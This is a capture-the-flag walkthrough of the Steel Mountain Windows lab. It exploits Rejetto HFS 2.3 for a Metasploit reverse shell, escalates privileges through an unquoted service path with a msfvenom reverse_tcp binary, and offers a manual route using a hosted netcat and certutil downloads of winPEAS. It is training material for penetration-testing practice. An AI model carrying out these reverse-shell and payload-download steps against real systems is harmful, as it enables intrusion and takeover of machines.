### Steel Mountain

| Windows machine

---------------------------------------------------------

`export ip=10.10.39.225`

#### Nmap

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/steelmountain]
└─$ nmap -sC  -sV -oN nmap/initial $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 14:53 IST
Nmap scan report for 10.10.39.225
Host is up (0.16s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2024-04-13T09:25:15+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-04-12T09:21:15
|_Not valid after:  2024-10-12T09:21:15
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-04-13T09:25:10+00:00
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:b3:55:bd:4a:ef (unknown)
| smb2-time: 
|   date: 2024-04-13T09:25:10
|_  start_date: 2024-04-13T09:21:07
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.42 seconds
```

#### HTTP server o on port 80

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/steelmountain]
└─$ feroxbuster -u http://10.10.39.225/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.39.225/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       16l       30w      772c http://10.10.39.225/index.html                                                                                    301      GET        2l       10w      147c http://10.10.39.225/img => http://10.10.39.225/img/                                                               200      GET      149l      813w    70728c http://10.10.39.225/img/logo.png                                                                                  200      GET     2632l    16842w  1359123c http://10.10.39.225/img/BillHarper.png                                                                            200      GET       16l       30w      772c http://10.10.39.225/                                                                                              403      GET       29l       92w     1233c http://10.10.39.225/img/                                                                                          301      GET        2l       10w      147c http://10.10.39.225/IMG => http://10.10.39.225/IMG/                                                               301      GET        2l       10w      147c http://10.10.39.225/Img => http://10.10.39.225/Img/                                                               [####################] - 7m    350611/350611  0s      found:8       errors:0      
[####################] - 6m     87650/87650   242/s   http://10.10.39.225/ 
[####################] - 6m     87650/87650   243/s   http://10.10.39.225/img/ 
[####################] - 6m     87650/87650   243/s   http://10.10.39.225/IMG/ 
[####################] - 6m     87650/87650   239/s   http://10.10.39.225/Img/                                                                               
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/steelmountain]
└─$ 
```

**Nothing intresting found**

#### HTTP server o on port 8080

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/steelmountain]
└─$ feroxbuster -u http://10.10.39.225:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.39.225:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       54l      252w     2338c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l        7w      601c http://10.10.39.225:8080/~img18
200      GET        3l        8w      894c http://10.10.39.225:8080/~img27
200      GET        4l       15w     1101c http://10.10.39.225:8080/~img8
200      GET        2l       15w     1192c http://10.10.39.225:8080/~img0
200      GET        3l       10w     1119c http://10.10.39.225:8080/~img1
200      GET        4l       16w     1098c http://10.10.39.225:8080/~img10
200      GET        3l        6w      558c http://10.10.39.225:8080/~img15
200      GET        1l       16w     1174c http://10.10.39.225:8080/~img3
200      GET        3l       11w      866c http://10.10.39.225:8080/favicon.ico
200      GET      120l      281w     3832c http://10.10.39.225:8080/
[########>-----------] - 5m     35741/87669   5m      found:10      errors:249    
[########>-----------] - 5m     35863/87669   5m      found:10      errors:249    
[########>-----------] - 5m     35996/87669   5m      found:10      errors:249    
[####################] - 11m    87669/87669   0s      found:10      errors:419    
[####################] - 11m    87650/87650   131/s   http://10.10.39.225:8080/                                                                              
```

**Nothing intresting found**

#### Initial access with metasploit

From accessing the webserver @ 8080, we found that it is HttpFileServer 2.3 (Rejetto HTTP File Server)

```
┌──(edith🛸HackBox)-[~/pwn]
└─$ searchsploit Rejetto HTTP File Server
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                     | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                          | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                             | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                        | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                        | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                   | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                | windows/webapps/49125.py
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

| use metasploit

**set opions and wexploit**

```
┌──(edith🛸HackBox)-[~/pwn]
└─$ msfconsole
Metasploit tip: View a module's description using info, or the enhanced 
version in your browser with info -d

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.4.2-dev                           ]
+ -- --=[ 2408 exploits - 1237 auxiliary - 422 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search Rejetto HTTP File Server

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description                                                                                                         
   ----       ---------------  --------  -----------                                                                                                         
   HTTPDELAY  10               no        Seconds to wait before terminating web server                                                                       
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]                                                        
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html              
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to liste
                                         n on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.110    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.39.225
RHOSTS => 10.10.39.225
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.17.49.246
LHOST => 10.17.49.246
msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT 1234
LPORT => 1234
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.39.225     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to liste
                                         n on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.17.49.246     yes       The listen address (an interface may be specified)
   LPORT     1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.17.49.246:1234 
[*] Using URL: http://10.17.49.246:8080/Dam06s
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /Dam06s
[*] Sending stage (176198 bytes) to 10.10.39.225
[!] Tried to delete %TEMP%\kPAWXSnMtwbKBb.vbs, unknown result
[*] Meterpreter session 1 opened (10.17.49.246:1234 -> 10.10.39.225:49256) at 2024-04-13 15:45:48 +0530
```

#### Privilege escalation

##### Upload powerup.ps1

**_powerup.ps1_ script checks for common Windows privilege escalation vectors that rely on misconfiguration**

```
meterpreter > upload /usr/share/privesc/windows/PowerUp.ps1
[*] Uploading  : /usr/share/privesc/windows/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /usr/share/privesc/windows/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /usr/share/privesc/windows/PowerUp.ps1 -> PowerUp.ps1
meterpreter > ls
Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
====================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2024-04-13 15:45:48 +0530  %TEMP%
100666/rw-rw-rw-  600580  fil   2024-04-13 16:01:29 +0530  PowerUp.ps1
100666/rw-rw-rw-  174     fil   2019-09-27 16:37:07 +0530  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-17 02:28:52 +0530  hfs.exe
```

##### Run uploaded script

- First Load the powershell module
- Then open powershell_shell 
- Run PowerUp.ps1 powershell script by `. .\PowerUp.ps1`
- Invoke it by "Invoke-AllChecks"

```
meterpreter > load powershell 
Loading extension powershell...Success.

meterpreter > powershell_shell 
PS > ls


    Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         4/13/2024   3:15 AM            %TEMP%
-a---         2/16/2014  12:58 PM     760320 hfs.exe
-a---         4/13/2024   3:31 AM     600580 PowerUp.ps1

PS > . .\PowerUp.ps1

PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```

##### Exploitation

**Here, _AdvancedSystemCareService9_ is service that has _Unquoted Service Paths_ vulnerability**

- It also has CanRestart options set to true (allows us to restart a service)
- And the path is writable 

```
ServiceName    : AdvancedSystemCareService9
Path           :         Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths


meterpreter > cd 'C:\Program Files (x86)\Iobit'
meterpreter > ls
Listing: C:\Program Files (x86)\Iobit
=====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  32768  dir   2024-04-13 14:52:18 +0530  Advanced SystemCare
040777/rwxrwxrwx  16384  dir   2019-09-27 11:05:24 +0530  IObit Uninstaller
040777/rwxrwxrwx  4096   dir   2019-09-26 20:48:50 +0530  LiveUpdate
```

- We can now replace  "**Advanced** SystemCare" with metasploit shell as _Advanced.exe_

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/steelmountain]
└─$  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.49.246 LPORT=8888 -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
```

- Then restart the service using sc start <service-name> in cmd (or) start-service <service-name>
  `C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9`

- Then launch the mtasploit meterpreter handler and set up

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lport 8888
lport => 8888
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.17.49.246
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.17.49.246:8888 
[*] Sending stage (176198 bytes) to 10.10.177.233
[*] Meterpreter session 7 opened (10.17.49.246:8888 -> 10.10.177.233:49250) at 2024-04-13 18:29:35 +0530

meterpreter > cd C:/users
meterpreter > dir
Listing: C:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2019-09-26 19:41:25 +0530  Administrator
040777/rwxrwxrwx  0     dir   2013-08-22 20:18:41 +0530  All Users
040555/r-xr-xr-x  0     dir   2014-03-22 00:48:16 +0530  Default
040777/rwxrwxrwx  0     dir   2013-08-22 20:18:41 +0530  Default User
040555/r-xr-xr-x  4096  dir   2013-08-22 21:09:32 +0530  Public
040777/rwxrwxrwx  8192  dir   2019-09-27 21:39:05 +0530  bill
100666/rw-rw-rw-  174   fil   2013-08-22 21:07:57 +0530  desktop.ini
```

#### Initial access without metasploit

- Download the exploit from [exploit db](https://www.exploit-db.com/exploits/39161) and change the hardcoded local ip and local port in which our netcat listening
- To run the exploit,we need netcat windows binary ([downloaded here](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)) hosted on our server (_spin the python http server on port 80_) which gets downloaded into taget machine while running the exploit 
  **_Note : As per the exploit, change the name of netcat ececutable to nc.exe and nc.exe shouyld be hosted on port 80_**

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/steelmountain/share]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Run the netcat for reverse connection on port that we hardcoded in exploit
- Run the exploit 1st tme to download the nc.exe on our server

![Download netcat](/home/edith/pwn/vuln_machines/steelmountain/001.png)

- Run it 2nd time for executing the nc on srerver fro reverse connerction 

![Execute netcat](/home/edith/pwn/vuln_machines/steelmountain/002.png)

#### Privelege escalation without metasploit

- Download the winpeas.ps1 script from our python webserver

```
C:\temp>certutil -urlcache -f http://10.17.49.246/winPEAS.ps1 winpeas.ps1
certutil -urlcache -f http://10.17.49.246/winPEAS.ps1 winpeas.ps1
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

- Run it

```
C:\temp>powershell -c ./winpeas.ps1
powershell -c ./winpeas.ps1
,/*,..*(((((((((((((((((((((((((((((((((,
,*/((((((((((((((((((/,  .*//((//**, .*((((((*
((((((((((((((((* *****,,,\########## .(* ,((((((
(((((((((((/*******************####### .(. ((((((
(((((((/******************/@@@@@/***\#######\((((((
,,..**********************/@@@@@@@@@/***,#####.\/(((((
, ,**********************/@@@@@+@@@/*********##((/ /((((
..(((##########*********/#@@@@@@@@@/*************,,..((((
.(((################(/******/@@@@@/****************.. /((
.((########################(/************************..*(
.((#############################(/********************.,(
.((##################################(/***************..(
.((######################################(/***********..(
.((######(,.***.,(###################(..***(/*********..(
.((######*(####((###################((######/(********..(
.((##################(/**********(################(**...(
.(((####################/*******(###################.((((
.(((((############################################/  /((
..(((((#########################################(..(((((.
....(((((#####################################( .((((((.
......(((((#################################( .(((((((.
(((((((((. ,(############################(../(((((((((.
  (((((((((/,  ,####################(/..((((((((((.
        (((((((((/,.  ,*//////*,. ./(((((((((((.
           (((((((((((((((((((((((((((/
          by PEASS-ng & RandolphConley
ADVISORY: WinPEAS - Windows local Privilege Escalation Awesome Script
WinPEAS should be used for authorized penetration testing and/or educational purposes only
Any misuse of this software will not be the responsibility of the author or of any other collaborator
Use it at your own networks and/or with the network owner's explicit permission
Indicates special privilege over an object or misconfiguration
Indicates protection is enabled or something is well configured
Indicates active users
Indicates disabled users
Indicates links
Indicates title
You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

====================================||SYSTEM INFORMATION ||====================================
The following information is curated. To get a full list of system information, run the cmdlet get-computerinfo


Host Name:                 STEELMOUNTAIN
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00253-50000-00000-AA656
Original Install Date:     9/26/2019, 7:11:06 AM
System Boot Time:          4/13/2024, 7:07:22 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 963 MB
Virtual Memory: Max Size:  2,432 MB
Virtual Memory: Available: 1,373 MB
Virtual Memory: In Use:    1,059 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\STEELMOUNTAIN
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB2919355
                           [02]: KB2919442
                           [03]: KB2937220
                           [04]: KB2938772
                           [05]: KB2939471
                           [06]: KB2949621
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.160.66
                                 [02]: fe80::99c4:8026:969c:7ff6
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

=========|| WINDOWS HOTFIXES
=| Check if windows is vulnerable with Watson https://github.com/rasta-mouse/Watson
Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)

HotfixID  Description InstalledBy                 InstalledOn          
--------  ----------- -----------                 -----------          
KB2938772 Update      STEELMOUNTAIN\Administrator 3/21/2014 12:00:00 AM
KB2939471 Update      STEELMOUNTAIN\Administrator 3/21/2014 12:00:00 AM
KB2949621 Hotfix      STEELMOUNTAIN\Administrator 3/21/2014 12:00:00 AM
KB2919355 Update      STEELMOUNTAIN\Administrator 3/21/2014 12:00:00 AM
KB2919442 Update      STEELMOUNTAIN\Administrator 3/21/2014 12:00:00 AM
KB2937220 Update      STEELMOUNTAIN\Administrator 3/21/2014 12:00:00 AM



=========|| ALL UPDATES INSTALLED

=========|| Drive Info
Drive: C:
Label: 
Size: 49.66 GB
Free Space: 41.11 GB


